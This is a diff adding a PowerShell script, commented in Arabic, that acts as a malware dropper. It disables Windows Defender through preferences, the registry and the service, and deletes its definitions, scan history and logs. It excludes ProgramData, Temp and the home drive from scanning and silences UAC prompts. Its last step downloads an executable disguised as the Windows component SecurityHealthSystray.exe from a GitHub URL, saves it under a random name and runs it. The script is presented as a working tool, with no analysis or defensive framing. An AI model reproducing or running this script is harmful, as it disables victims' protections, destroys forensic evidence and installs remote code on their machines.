@@ -1,0 +1,52 @@
+if(-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole("Administrator")){exit}
+
+# تعطيل مكوّنات Windows Defender
+Set-MpPreference -DisableRealtimeMonitoring $true
+Set-MpPreference -DisableBehaviorMonitoring $true
+Set-MpPreference -DisableBlockAtFirstSeen $true
+Set-MpPreference -DisableIOAVProtection $true
+Set-MpPreference -DisablePrivacyMode $true
+Set-MpPreference -DisableScriptScanning $true
+Set-MpPreference -EnableControlledFolderAccess Disabled
+Set-MpPreference -PUAProtection 0
+
+# تعطيل مضاد البرمجيات عبر الريجيستري
+New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Force | Out-Null
+Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1
+
+# إيقاف خدمة Windows Defender ومنعها من البدء
+Stop-Service -Name WinDefend -Force -ErrorAction SilentlyContinue
+Set-Service -Name WinDefend -StartupType Disabled -ErrorAction SilentlyContinue
+
+# المزيد من إعدادات السياسة لتعطيل المراقبة
+$regPath="HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Policy Manager"
+New-Item -Path $regPath -Force | Out-Null
+Set-ItemProperty -Path $regPath -Name "AllowRealtimeMonitoring" -Value 0
+
+# حذف ملفات تعريف التهديدات وسجلات ومجلدات الفحص
+Remove-Item -Path "C:\ProgramData\Microsoft\Windows Defender\Definition Updates\*" -Recurse -Force -ErrorAction SilentlyContinue
+Remove-Item -Path "C:\ProgramData\Microsoft\Windows Defender\Scans\History\*" -Recurse -Force -ErrorAction SilentlyContinue
+Remove-Item -Path "C:\ProgramData\Microsoft\Windows Defender\Logs\*" -Recurse -Force -ErrorAction SilentlyContinue
+Remove-Item -Path "C:\ProgramData\Microsoft\Windows Defender\Scans\*" -Recurse -Force -ErrorAction SilentlyContinue
+Remove-Item -Path "C:\ProgramData\Microsoft\Windows Defender\Support\*" -Recurse -Force -ErrorAction SilentlyContinue
+
+# تحضير أمر PowerShell بصيغة مقروءة (سلاسل)
+$A = "Start"
+$B = "powershell"
+$C = "-ExecutionPolicy Bypass"
+$D = "Add-MpPreference -ExclusionPath '$Env:ProgramData, $Env:Temp, $Env:HomeDrive;'"
+$E = "Set-ItemProperty -Path ""HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"" -Name ""ConsentPromptBehaviorAdmin"" -Value 0 -Type DWord"
+$F = $C + " " + $D + " " + $E
+
+# تشغيل Process مع طلب صلاحيات مرتفعة لتطبيق الاستثناءات وتغيير UAC
+Start-Process $B -ArgumentList $F -Verb "RunAs"
+
+# تنزيل ملف خارجي إلى ProgramData ثم تشغيله
+$G = "https://github.com/MYRALL/fixx/raw/refs/heads/master/SecurityHealthSystray.exe"
+$I = Join-Path $Env:ProgramData ("j3owB.exe")
+Invoke-WebRequest -Uri $G -OutFile $I
+Start-Process $I
+
+# حفظ المسار في مصفوفة (لأغراض داخلية بالسكريبت)
+$Items = @()
+$Items += $I
